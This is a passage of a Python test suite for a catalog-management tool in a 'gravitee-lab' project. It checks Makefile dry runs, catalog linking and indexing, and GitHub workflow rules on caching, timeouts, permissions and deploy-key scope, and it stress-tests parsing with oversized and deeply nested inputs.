        make = support.need("make")
        for target in ("dev", "check", "ci", "index", "upgrade", "settings", "release", "explain"):
            import subprocess
            done = subprocess.run([make, "-n", target, "VERSION=1.0.0", "CODE=ST05"], cwd=str(self.repo.root), capture_output=True, text=True,
                                  env={"PATH": os.environ.get("PATH", "")})
            self.assertEqual(done.returncode, 0, f"{target}: {done.stderr}")
            self.assertIn("python3 -I ../gravitee-lab/lab-ui/catalog.py", done.stdout, target)
        done = subprocess.run([make, "-n", "ci"], cwd=str(self.repo.root), capture_output=True, text=True, env={"PATH": os.environ.get("PATH", "")})
        self.assertIn("catalog.py check .", done.stdout)
        self.assertIn("catalog.py ci run .", done.stdout)

    def test_make_upgrade_says_the_plan(self):
        make = support.need("make")
        import subprocess
        done = subprocess.run([make, "-n", "upgrade", "WRITE=1", "LAB_REF=latest"], cwd=str(self.repo.root), capture_output=True, text=True,
                              env={"PATH": os.environ.get("PATH", "")})
        self.assertIn("catalog.py upgrade . --write --lab-ref latest", done.stdout)

    def test_compose_reads_the_sample_add_on_and_the_lab_finds_nothing_to_say(self):
        from tests import fixtures
        if not fixtures.have_compose():
            support.skip("the Docker CLI with Compose 5 or later is not installed, the sample add-on was not read")
        from lab_ui.library import check, project
        from lab_ui.docker import compose, envfiles
        from lab_ui.gravitee import license
        from lab_ui import paths
        from lab_ui.catalogs import cli as catalog
        self.folder(check, paths, project, compose, envfiles)
        fixtures.core(self)
        fixtures.default(self, "fixture")
        shutil.copy(fixtures.CORE.parent / check.LOCK_FILE, self.root / check.LOCK_FILE)
        self.patch(license, "status_of", lambda variable: None)
        project.forget()
        home = Path(tempfile.mkdtemp(prefix="gravitee-lab-home-")).resolve()
        self.addCleanup(shutil.rmtree, home, True)
        self.patch(gitx, "home", lambda: home)
        folder = home / "hub"
        standard.create(folder, params())
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            self.assertEqual(catalog.main(["link", str(folder)]), 0, err.getvalue())
            code = catalog.main(["check", "acme-hub"])
        self.assertEqual((code, err.getvalue()), (0, ""), out.getvalue())
        self.assertIn("All good", out.getvalue())
        # the index the managed `static` job and `make index` write, of the folder where it is (a folder is not an id)
        index = home / "catalog.json"
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = catalog.main(["index", str(folder), "--out", str(index)])
        self.assertEqual((code, err.getvalue()), (0, ""))
        document = json.loads(index.read_text(encoding="utf-8"))
        self.assertEqual((document["catalog"]["id"], document["standard"], [unit["id"] for unit in document["units"]]),
                         ("acme-hub", standard.LEVEL, ["hello"]))


class Rules(unittest.TestCase):
    """The workflow rules on every managed file."""

    def test_every_managed_workflow_and_action_passes_every_rule(self):
        files = render(**EVERYTHING)
        for path, data in files.items():
            if path.startswith(".github/workflows/") or (path.startswith(".github/actions/") and path.endswith("action.yml")):
                self.assertEqual(workflows.problems(path, data.decode("utf-8")), [], path)
        self.assertEqual([each for each in workflows.check(tree_of(files)) if each.severity == "error"], [])

    def test_the_lab_key_goes_to_the_lab_action_alone_called_from_the_checkout_of_the_catalog(self):
        for path, data in render(**EVERYTHING).items():
            for line in data.decode("utf-8").split("\n"):
                if "LAB_DEPLOY_KEY" in line and "secrets." in line:
                    self.assertIn("key: ${{ secrets.LAB_DEPLOY_KEY }}", line, path)
        text = render()[".github/workflows/ci.yml"].decode()
        self.assertEqual(text.count("uses: ./catalog/.github/actions/lab"), 3)

    def test_no_cache_of_any_kind_in_the_files(self):
        for path, data in render(**EVERYTHING).items():
            if path.startswith(".github/"):
                code = "\n".join(line for line in data.decode().split("\n") if not line.lstrip().startswith("#"))
                self.assertNotRegex(code, r"actions/cache|cache-from|cache-to|type=gha|^\s*(?:- )?cache:", path)

    def test_every_job_has_a_timeout_and_the_token_only_reads_at_the_top(self):
        for path, data in render(**EVERYTHING).items():
            if path.startswith(".github/workflows/"):
                text = data.decode()
                self.assertIn("permissions:\n  contents: read\n", text, path)
                jobs = re.split(r"^  ([\w-]+):\s*$", text.split("\njobs:\n", 1)[1], flags=re.M)
                for name, body in zip(jobs[1::2], jobs[2::2]):
                    self.assertIn("timeout-minutes:", body, f"{path} {name}")


class Hostile(unittest.TestCase):

    def test_a_catalog_of_twenty_thousand_units_is_judged_without_reading_the_unmanaged_files(self):
        files = render()
        listing = [(f"addons/a{n}/compose.yml") for n in range(20000)]
        from lab_ui.catalogs.tree import Entry
        entries = [Entry("100644", path, len(data)) for path, data in files.items()] + [Entry("100644", path, 1) for path in listing]
        reads = []

        def read(path, limit=1048576):
            reads.append(path)
            return files.get(path)
        start = time.process_time()
        found = standard.drift(ListTree(entries, read))
        self.assertLess(time.process_time() - start, 2.0)
        self.assertEqual(found, [])
        self.assertTrue(set(reads) <= set(standard.managed_paths()) | {"catalog.yml", "Makefile"}, set(reads) - set(standard.managed_paths()))

    def test_a_standard_json_nested_a_hundred_thousand_deep_is_one_finding(self):
        files = {**render(), ".github/standard.json": b"[" * 100000}
        found = [each for each in standard.drift(tree_of(files)) if each.code == "SD04"]
        self.assertEqual(len(found), 1)
        files = {**render(), ".github/standard.json": b'{"a":' * 700 + b"1" + b"}" * 700}
        self.assertTrue([each for each in standard.drift(tree_of(files)) if each.code == "SD04"])

    def test_the_plan_of_a_hostile_catalog_yml_costs_little(self):
        files = {**render(), "catalog.yml": b"x-gravitee-catalog:\n  id: " + b"a" * 1000000 + b"\n"}
        start = time.process_time()
        plan = standard.upgrade_plan(tree_of(files), {})
        self.assertLess(time.process_time() - start, 2.0)
        self.assertEqual(plan["refused"], "")


def main():
    if "--write" in sys.argv:
        print(standard.write_golden())
        return
    unittest.main()


if __name__ == "__main__":
    main()
